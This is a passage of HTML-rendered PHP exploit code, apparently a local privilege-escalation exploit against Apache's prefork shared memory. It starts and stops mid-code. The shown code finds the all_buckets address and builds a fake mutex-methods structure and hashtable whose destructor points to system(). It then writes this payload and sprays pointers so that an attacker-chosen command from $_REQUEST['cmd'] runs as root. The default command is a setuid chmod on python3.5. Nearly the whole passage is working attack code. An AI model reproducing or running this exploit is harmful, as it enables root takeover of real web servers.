&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!in($pointer, $addresses[&#39;libaprR&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;[&amp;mutex]: 0x&#39; . dechex($i));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;&nbsp;&nbsp;[mutex]: 0x&#39; . dechex($mutex));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[meth]: 0x&#39; . dechex($meth));</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# meth-&gt;*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# flags</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(str2ptr($this-&gt;abc, $pointer - $address) != 0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# methods</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for($j=0;$j&lt;7;$j++)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$m = str2ptr($this-&gt;abc, $pointer + 0x8 + $j * 8 - $address);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!in($m, $addresses[&#39;libaprX&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue 2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*]: 0x&#39; . dechex($m));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$all_buckets = $i - 0x10;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;all_buckets = 0x&#39; . dechex($all_buckets));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!$all_buckets)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Unable to find all_buckets&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# The address of all_buckets will change when apache is gracefully</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# restarted. This is a problem because we need to know all_buckets&#39;s</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# address in order to make all_buckets[some_index] point to a memory</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# region we control.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Compute potential bucket indexes and their addresses</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Computing potential bucket indexes and addresses&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Since we have sizeof($workers_pid) MPM workers, we can fill the rest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# of the ap_score_image-&gt;servers items, so 256 - sizeof($workers_pids),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# with data we like. We keep the one at the top to store our payload.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# The rest is sprayed with the address of our payload.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$size_prefork_child_bucket = 24;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$size_worker_score = 264;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I get strange errors if I use every &quot;free&quot; item, so I leave twice as</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# many items free. I&#39;m guessing upon startup some</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$spray_max = $addresses[&#39;shm&#39;][1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$spray_min = $spray_max - $spray_size;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$spray_middle = (int) (($spray_min + $spray_max) / 2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bucket_index_middle = (int) (</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- ($all_buckets - $spray_middle) /</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$size_prefork_child_bucket</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Build payload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# A worker_score structure was kept empty to put our payload in</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$payload_start = $spray_min - $size_worker_score;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$z = ptr2str(0);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Payload maxsize 264 - 112 = 152</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Offset 8 cannot be 0, but other than this you can type whatever</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# command you want</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bucket = isset($_REQUEST[&#39;cmd&#39;]) ?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_REQUEST[&#39;cmd&#39;] :</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;chmod +s /usr/bin/python3.5&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(strlen($bucket) &gt; $size_worker_score - 112)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Payload size is bigger than available space (&#39; .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;($size_worker_score - 112) .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;), exiting.&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Align</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bucket = str_pad($bucket, $size_worker_score - 112, &quot;\x00&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# apr_proc_mutex_unix_lock_methods_t</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$meth = </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$z .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$z .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$z .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$z .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$z .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$z .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# child_init</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr2str($addresses[&#39;zend_object_std_dtor&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# The second pointer points to meth, and is used before reaching the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# arbitrary function call</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# The third one and the last one are both used by the function call</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# zend_object_std_dtor(object) =&gt; ... =&gt; system(&amp;arData[0]-&gt;val)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$properties = </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# refcount</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr2str(1) .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# u-nTableMask meth</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr2str($payload_start + strlen($bucket)) .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Bucket arData</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr2str($payload_start) .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# uint32_t nNumUsed;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr2str(1, 4) .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# uint32_t nNumOfElements;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr2str(0, 4) .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# uint32_t nTableSize</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr2str(0, 4) .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# uint32_t nInternalPointer</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr2str(0, 4) .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# zend_long nNextFreeElement</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$z .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# dtor_func_t pDestructor</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr2str($addresses[&#39;system&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$payload =</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bucket .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$meth .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$properties</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Write the payload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Placing payload at address 0x&#39; . dechex($payload_start));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$p = $payload_start - $address;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$i = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$i &lt; strlen($payload);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$i++</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[$p+$i] = $payload[$i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Fill the spray area with a pointer to properties</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$properties_address = $payload_start + strlen($bucket) + strlen($meth);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Spraying pointer&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Address: 0x&#39; . dechex($properties_address));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;From: 0x&#39; . dechex($spray_min));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;To: 0x&#39; . dechex($spray_max));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Size: 0x&#39; . dechex($spray_size));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Covered: 0x&#39; . dechex($spray_size * count($workers_pids)));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Apache: 0x&#39; . dechex(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addresses[&#39;apache&#39;][1] -</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addresses[&#39;apache&#39;][0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$s_properties_address = ptr2str($properties_address);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$i = $spray_min;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$i &lt; $spray_max;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$i++</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[$i - $address] = $s_properties_address[$i % 8];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Find workers PID in the SHM: it indicates the beginning of their</span><span class="cs8926E06"><br/></span><span 